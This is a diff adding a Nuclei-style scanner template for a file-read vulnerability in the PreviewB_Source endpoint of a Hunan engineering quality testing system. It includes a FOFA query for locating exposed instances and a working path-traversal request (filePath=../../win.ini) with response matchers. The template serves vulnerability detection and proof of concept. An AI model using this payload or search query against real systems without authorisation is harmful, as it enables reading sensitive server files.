@@ -1,0 +1,24 @@
+id: hunan-jianyan-test-previewb_source-file-read
+
+info:
+  name: 湖南建研工程质量检测系统 PreviewB_Source 接口文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/Content/Theme/Standard/"
+          湖南建研工程质量检测系统 PreviewB_Source 接口存在文件读取安全缺陷，攻击者可利用该漏洞读取系统敏感文件，导致信息泄露及潜在的安全风险
+  tags: 湖南建研工程质量检测系统
+
+http:
+- raw:
+  - |
+    GET /Applications/Attachment/PreviewB_Source.cshtml?filePath=../../win.ini HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
